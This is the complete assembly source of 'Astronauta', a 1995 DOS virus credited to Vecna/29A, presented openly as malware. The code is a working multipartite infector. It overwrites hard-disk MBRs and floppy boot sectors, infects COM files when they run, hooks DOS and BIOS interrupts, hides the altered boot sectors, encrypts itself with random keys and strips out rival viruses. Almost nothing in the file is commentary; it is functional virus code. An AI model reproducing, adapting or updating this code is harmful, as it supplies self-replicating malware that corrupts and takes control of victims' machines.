;              '旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커'
;               � *******:::: Astronauta Virus ::::******* �
;               � 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴 �
;               � ********** -= Vecna / 29a =- *********** �
;              '읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸'


;[Astronauta] by Vecna/29A - detected by AVP as Vecna.1401
;Multipartite MBR/BOOT/COM infector
;Disinfect some virii
;Encripted
;
;A old virus, wrote in a bad mood day
;

.model tiny
.code
.8086
.startup
jumps

Start:
       mov ax, cs
       mov ds, ax
       mov es, ax
       mov si, offset StartEnc
       mov di, si
       mov cx, offset EndEnc-offset StartEnc
EncLoop:
       lodsb
       xor al, 00
   Enc1 = $-1
       add al, 00
   Enc2 = $-1
       db 0f1h
       xor al, 00
   Enc3 = $-1
       stosb
       jmp $+2
       loop EncLoop

StartEnc:
       mov si, offset RestCode
       mov di, 0100h-(offset EndRestCode-offset RestCode)
       mov cx, offset EndRestCode-offset RestCode
       mov ax, 0cccch
       int 13h
       cmp bx, 0ddddh
       je RestoreCode
       cmp ds:[0], 020cdh
       je PSPHere
       jmp InBoot
PSPHere:
       push es
       push ds
       mov ah, 13h
       int 2fh
       push es
       push bx
       int 2fh
       pop bx
       pop es
       mov word ptr cs:[i13], bx
       mov bx, es
       mov word ptr cs:[i13+2], bx
       pop ds
       pop es
       call InfectHD
RestoreCode:
       mov ax, di
       rep movsb
       add cx, 7
       xor si, si
PushLoop:
       push si
       loop PushLoop
       jmp ax

RestCode:
       mov si, offset EndVirus
   HostCode = $-2
       mov di, 0100h
       mov cx, offset EndVirus-offset Start
DecLoop:
       lodsb
       xor al, 00
   Enc4 = $-1
       stosb
       loop DecLoop
       pop ax
       pop bx
       pop cx
       pop dx
       pop si
       pop di
       pop bp
EndRestCode:

Int13:
       pushf
       call dword ptr cs:[i13]
       ret

Int21:
       pushf
       call dword ptr cs:[i21]
       ret

Int40:
       pushf
       call dword ptr cs:[i40]
       ret

InfectHD:
       push ax
       push bx
       push cx
       push dx
       push si
       push di
       push bp
       push es
       push ds
       mov byte ptr [Enc1], 0
       mov byte ptr [Enc2], 0
       mov byte ptr [Enc3], 0
       mov ax, 201h
       mov cx, 1
       mov dx, 80h
       mov bx, -1024
       call Int13
       jc ErrorRet
       mov ax, word ptr [Loader]
       cmp word ptr [bx], ax
       je ErrorRet
       mov ax, 301h
       mov cx, 2
       call Int13
       jc ErrorRet
       push bx
       mov ax, 303h
       mov cx, 3
       mov bx, 0100h
       call Int13
       pop bx
       jc ErrorRet
       mov di, bx
       mov si, offset Loader
       mov cx, offset EndLoader-offset Loader
       rep movsb
       mov ax, 301h
       mov cx, 1
       call Int13
ErrorRet:
       pop ds
       pop es
       pop bp
       pop di
       pop si
       pop dx
       pop cx
       pop bx
       pop ax
       ret

       db '[ASTRONAUTA] virus written in Brasil by Vecna - 1995', 0

Loader:
       db 0f1h
       cli
       xor ax, ax
       mov ss, ax
       mov sp, 7c00h
       sti
       mov ds, ax
       sub word ptr ds:[413h], 3
       int 12h
       mov cl, 6
       shl ax, cl
       sub ax, 10h
       mov es, ax
       mov bx, 0100h
       mov ax, 203h
       mov cx, 3
       mov dh, 0
       cmp dl, 80h
       je Read
       mov cx, 13
       mov dh, 1
Read:
       int 13h
       push es
       push bx
       retf
EndLoader:

Handler13:
       cmp ax, 0cccch
       jne NotResTest
       mov bx, 0ddddh
       iret
NotResTest:
       cmp dx, 0080h
       jne Exit13
       cmp cx, 1
       jne Exit13
       inc cx
       call int13
       pushf
       dec cx
       popf
       retf 2
Exit13:
       db 0eah
i13    dd ?

Handler1c:
       cmp word ptr cs:[i21], -1
       jnz AlreadyHooked
       push ax
       push ds
       sub ax, ax
       mov ds, ax
       mov ax, word ptr ds:[21h*4+2]
       cmp ax, 0800h
       ja NotYet
       mov word ptr cs:[i21+2], ax
       mov ax, word ptr ds:[21h*4]
       mov word ptr cs:[i21], ax
       mov ax, offset Handler21
       mov word ptr ds:[21h*4], ax
       mov ax, cs
       mov word ptr ds:[21h*4+2], ax
       mov ax, word ptr ds:[28h*4+2]
       mov word ptr cs:[i28+2], ax
       mov ax, word ptr ds:[28h*4]
       mov word ptr cs:[i28], ax
       mov ax, offset Handler28
       mov word ptr ds:[28h*4], ax
       mov ax, cs
       mov word ptr ds:[28h*4+2], ax
NotYet:
       pop ds
       pop ax
AlreadyHooked:
       db 0eah
i1c    dd ?

Execute:
       push ax
       push bx
       push cx
       push dx
       push si
       push di
       push bp
       push es
       push ds
       mov ax, 4300h
       call Int21
       jc ErrorInfecting
       mov ax, 4301h
       and cx, not 1
       call Int21
       jc ErrorInfecting
       mov ax, 3d02h
       call Int21
       jc ErrorInfecting
       mov bx, ax
       mov ax, 5700h
       call Int21
       push cx
       push dx
       push cs
       push cs
       pop ds
       pop es
       mov ax, 4400h
       call Int21
       jc ErrorClose
       test dl, dl
       js ErrorClose
       push bx
       call Clean
       pop bx
       call SeekBOF
       mov ah, 3fh
       mov dx, offset EndVirus
       mov si, dx
       mov cx, offset EndVirus-offset Start
       call Int21
       jc ErrorClose
       mov ax, word ptr [si]
       cmp word ptr [Start], ax
       je ErrorClose
       cmp ax, 'MZ'
       je ErrorClose
       cmp ax, 'ZM'
       je ErrorClose
       call SeekEOF
       or dx, dx
       jnz ErrorClose
       cmp ax, 55000
       ja ErrorClose
       cmp ax, 5000
       jb ErrorClose
       push ax
GetAgain:
       in al, 40h
       or al, al
       jz GetAgain
       mov dx, ax
       mov byte ptr [enc4], dl
       mov si, offset EndVirus
       mov di, si
       mov cx, offset EndVirus-offset Start
LoopEnc:
       lodsb
       xor al, dl
       stosb
       loop LoopEnc
       mov ah, 40h
       mov dx, offset EndVirus
       mov cx, offset EndVirus-offset Start
       call Int21
       pop ax
       jc ErrorClose
       add ax, 0100h
       mov word ptr [HostCode], ax
Next1:
       in al, 40h
       or al, al
       jz Next1
       mov ah, al
Next2:
       in al, 40h
       or al, al
       jz Next2
       mov dl, al
Next3:
       in al, 40h
       or al, al
       jz Next3
       mov byte ptr [Enc1], al
       mov byte ptr [Enc2], dl
       mov byte ptr [Enc3], ah
       mov dh, al
       push ax
       push dx
       call SeekBOF
       mov ah, 40h
       mov dx, offset Start
       mov cx, offset StartEnc-offset Start
       call Int21
       pop dx
       pop ax
       mov si, offset StartEnc
       mov di, offset EndVirus
       mov cx, offset EndEnc-offset StartEnc
EncriptionLoop:
       lodsb
       xor al, ah
       sub al, dl
       xor al, dh
       stosb
       loop EncriptionLoop
       mov ah, 40h
       mov dx, offset EndVirus
       mov cx, offset EndEnc-offset StartEnc
       call Int21
ErrorClose:
       pop dx
       pop cx
       mov ax, 5701h
       call Int21
       mov ah, 3eh
       call Int21
ErrorInfecting:
       pop ds
       pop es
       pop bp
       pop di
       pop si
       pop dx
       pop cx
       pop bx
       pop ax
       jmp DoInt21

       db 0, 'Death to Darkman/VLAD', 0

Handler21:
       push ax
       push bx
       pop bx
       dec sp
       dec sp
       pop ax
       cmp ax, bx
       pop ax
       je Ok
       stc
       retf 2
ok:
       cmp ax, 4b00h
       jne DarkmanChecks
       jmp Execute
DarkmanChecks:
       cmp ax, 6301h
       jb DoInt21
       cmp ax, 6304h
       ja DoInt21
FakeCheck:
       mov bx, ax
       iret
DoInt21:
       db 0eah
i21    dd ?

Handler28:
       cmp ax, 6303h
       je FakeCheck
       db 0eah
i28    dd ?

Stealth:
       pop ds
       pop es
       pop bp
       pop di
       pop si
       pop dx
       pop cx
       pop bx
       pop ax
       mov cx, 12
       mov dx, 100h
       call Int40
       mov cx, 1
       mov dx, 0
       retf 2

Handler40:
       or dx, dx
       jne Error40
       cmp cx, 1
       jne Error40
       push ax
       push bx
       push cx
       push dx
       push si
       push di
       push bp
       push es
       push ds
       push cs
       push cs
       pop ds
       pop es
       mov ax, 201h
       mov bx, offset EndVirus
       call Int40
       jc ErrorRes
       mov ax, word ptr [Loader]
       cmp word ptr [EndVirus+3eh], ax
       je Stealth
       mov ax, 301h
       mov cx, 12
       mov dx, 0100h
       call Int40
       jc ErrorRes
       mov ax, 303h
       mov cx, 13
       mov bx, 0100h
       mov dx, bx
       call Int40
       cld
       mov di, offset EndVirus+3eh
       mov si, offset Loader
       mov cx, offset EndLoader-offset Loader
       rep movsb
       mov ax, 301h
       mov bx, offset EndVirus
       xor dx, dx
       mov cx, 1
       call Int40
ErrorRes:
       pop ds
       pop es
       pop bp
       pop di
       pop si
       pop dx
       pop cx
       pop bx
       pop ax
Error40:
       db 0eah
i40    dd ?

       db 'Death to Darkman/VLAD', 0

InBoot:
       push cs
       pop es
       xor ax, ax
       mov ds, ax
       mov ax, word ptr ds:[13h*4]
       mov word ptr es:[i13], ax
       mov ax, word ptr ds:[13h*4+2]
       mov word ptr es:[i13+2], ax
       mov ax, word ptr ds:[1ch*4]
       mov word ptr es:[i1c], ax
       mov ax, word ptr ds:[1ch*4+2]
       mov word ptr es:[i1c+2], ax
       mov ax, -1
       mov word ptr es:[i21], ax
       mov word ptr es:[i21+2], ax
       mov word ptr ds:[21h*4], ax
       mov word ptr ds:[21h*4+2], ax
       mov ax, word ptr ds:[40h*4]
       mov word ptr es:[i40], ax
       mov ax, word ptr ds:[40h*4+2]
       mov word ptr es:[i40+2], ax
       mov ax, cs
       mov word ptr ds:[13h*4], offset handler13
       mov word ptr ds:[13h*4+2], ax
       mov word ptr ds:[1ch*4], offset handler1c
       mov word ptr ds:[1ch*4+2], ax
       mov word ptr ds:[40h*4], offset handler40
       mov word ptr ds:[40h*4+2], ax
       int 19h

SeekEOF:
       mov ax, 4202h
       jmp DoIt
SeekBOF:
       mov ax, 4200h
DoIt:
       xor cx, cx
       cwd
       call Int21
       ret

Clean:
       mov si, offset ScanStrings
       mov di, si
       mov cx, offset EndVirus-offset ScanStrings
n1:
       lodsb
       xor al, 00
   Enc5 = $-1
       stosb
       loop n1
Retry:
       in al, 40h
       or al, al
       jz Retry
       mov byte ptr [Enc5], al
       mov byte ptr [Enc6], al
       call CleanInsert1
       call CleanInsert2
       call CleanReplicator

       mov si, offset ScanStrings
       mov di, si
       mov cx, offset EndVirus-offset ScanStrings
n2:
       lodsb
       xor al, 00
   Enc6 = $-1
       stosb
       loop n2
       ret

CleanInsert1:
       mov ax, 4200h
       mov dx, 103h
       xor cx, cx
       call Int21
       jc Error1
       mov ah, 3fh
       mov dx, offset EndVirus
       mov di, dx
       mov cx, 12
       call Int21
       jc Error1
       xor ax, ax
       xchg word ptr [di+5], ax
       mov si, offset Insert1
       mov cx, 12
Restore:
       rep cmpsb
       jne Error1
       push ax
       call SeekBOF
       mov ah, 3fh
       mov cx, 14
       mov dx, offset EndVirus
       mov di, dx
       call Int21
       pop ax
       xor al, 0ebh
       mov byte ptr [di+13], al
       call SeekBOF
       mov cx, 14
WritePatch:
       mov ah, 40h
       mov dx, offset EndVirus
       call Int21
       push bx
       mov ah, 45h
       call Int21
       mov bx, ax
       mov ah, 3eh
       call Int21
       pop bx
Error1:
       ret

CleanInsert2:
       mov ax, 4200h
       mov dx, 0f8h
       xor cx, cx
       call Int21
       jc Error1
       mov ah, 3fh
       mov dx, offset EndVirus
       mov di, dx
       mov cx, 12
       call Int21
       jc Error1
       xor ax, ax
       xchg byte ptr [di+5], al
       mov si, offset Insert2
       mov cx, 10
       jmp restore

CleanReplicator:
       call SeekEOF
       sub ax, 651
       sbb dx, 0
       mov cx, dx
       mov dx, ax
       mov ax, 4200h
       call Int21
       mov ah, 3fh
       mov dx, offset EndVirus
       mov di, dx
       mov cx, 11h
       call Int21
       jc Error1
       mov si, offset Replicator
       mov bp, si
       mov cx, 12
       rep cmpsb
       jne Error1
       mov byte ptr [bp+10h], 0ebh
       call SeekBOF
       mov cx, 11h
       jmp WritePatch

ScanStrings:
;             mov   cx   val  xor  di    VALUE    inc  inc  loop        ret
Insert1    db 0b9h, 7eh, 00h, 81h, 35h, 00h, 00h, 47h, 47h, 0e2h, 0f8h, 0c3h
;             mov   cx    val  xor  di   VAL  inc  loop        ret
Insert2    db 0b9h, 0f2h, 00h, 80h, 35h, 00h, 47h, 0e2h, 0fah, 0c3h
;
Replicator db 0e8h, 00h, 00h, 5dh, 081h, 0edh, 03h, 00, 1eh, 06h, 0b8h, 04h
           db 063h, 0cdh, 021h
EndEnc:

EndVirus:
       int 20h

end Start
